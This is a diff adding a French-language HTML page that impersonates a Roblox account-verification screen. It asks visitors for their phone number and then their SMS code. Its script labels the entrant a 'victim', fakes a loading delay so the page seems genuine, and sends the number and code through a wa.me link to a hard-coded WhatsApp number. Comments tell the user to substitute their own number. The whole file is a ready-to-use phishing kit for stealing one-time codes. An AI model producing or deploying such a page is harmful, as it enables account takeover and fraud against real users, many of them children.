@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion Roblox</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #232527; /* Fond Roblox */
+            font-family: 'Hanken Grotesk', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background-color: #393b3d;
+            padding: 30px;
+            border-radius: 8px;
+            width: 300px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+            text-align: center;
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: 800;
+            margin-bottom: 20px;
+            letter-spacing: -1px;
+        }
+        
+        .logo-icon {
+            background-color: white;
+            color: black;
+            padding: 5px;
+            border-radius: 4px;
+            margin-right: 5px;
+            display: inline-block;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #555;
+            border-radius: 4px;
+            background-color: #1e2021;
+            color: white;
+            box-sizing: border-box;
+            font-size: 14px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: #fff;
+        }
+
+        button {
+            width: 100%;
+            padding: 12px;
+            margin-top: 15px;
+            background-color: white;
+            color: black;
+            border: none;
+            border-radius: 4px;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #e5e5e5;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .error {
+            color: #ff4d4d;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .loading {
+            margin-top: 20px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="logo">
+            <span class="logo-icon">⬛</span><span>Roblox</span>
+        </div>
+
+        <!-- ÉTAPE 1 : LE NUMÉRO -->
+        <div id="step1">
+            <h3 style="margin-top:0">Vérification du compte</h3>
+            <p style="font-size: 14px; color: #ccc;">Entrez votre numéro pour valider la transaction.</p>
+            <input type="text" id="phoneNumber" placeholder="Numéro de téléphone">
+            <div class="error" id="error1">Numéro invalide.</div>
+            <button onclick="sendNumber()">Suivant</button>
+        </div>
+
+        <!-- ÉTAPE 2 : LE CODE -->
+        <div id="step2" class="hidden">
+            <h3 style="margin-top:0">Sécurité</h3>
+            <p style="font-size: 14px; color: #ccc;">Entrez le code reçu par SMS.</p>
+            <input type="text" id="codeInput" maxlength="4" placeholder="XXXX" style="text-align: center; letter-spacing: 5px; font-size: 18px;">
+            <div class="error" id="error2">Code invalide.</div>
+            <button onclick="sendCode()">Valider</button>
+            <div class="loading" id="loader">
+                <div class="spinner"></div>
+                Vérification...
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // --- CONFIGURATION ---
+        // REMPLACE ÇA PAR TON NUMÉRO WHATSAPP (sans le +)
+        const MON_WHATSAPP = "33667972187"; 
+
+        let victimNumber = "";
+
+        // ÉTAPE 1 : ENVOYER LE NUMÉRO
+        function sendNumber() {
+            const input = document.getElementById('phoneNumber').value;
+            const error = document.getElementById('error1');
+
+            if (input.length < 5) {
+                error.style.display = "block";
+                return;
+            }
+
+            victimNumber = input;
+            error.style.display = "none";
+            
+            // On simule que le site demande le code
+            alert("Code de vérification envoyé au " + input);
+
+            // Passage à l'étape 2
+            document.getElementById('step1').classList.add('hidden');
+            document.getElementById('step2').classList.remove('hidden');
+        }
+
+        // ÉTAPE 2 : ENVOYER LE CODE
+        function sendCode() {
+            const codeInput = document.getElementById('codeInput').value;
+            const error = document.getElementById('error2');
+            const loader = document.getElementById('loader');
+            const btn = document.querySelector('#step2 button');
+
+            if (codeInput.length < 4) {
+                error.style.display = "block";
+                return;
+            }
+
+            // Animation de chargement
+            btn.style.display = "none";
+            loader.style.display = "block";
+
+            // Délai de 2 secondes pour faire "vrai"
+            setTimeout(() => {
+                loader.style.display = "none";
+                btn.style.display = "block";
+                
+                // Envoi du NUMÉRO et du CODE ensemble sur ton WhatsApp
+                const message = `🔔 *TRANSACTION PSN/ROBLOX*\n\n👤 Numéro de la victime : ${victimNumber}\n🔢 Code validé : ${codeInput}`;
+                
+                const url = `https://wa.me/${MON_WHATSAPP}?text=${encodeURIComponent(message)}`;
+                window.open(url, '_blank');
+                
+            }, 1500);
+        }
+    </script>
+</body>
+</html>
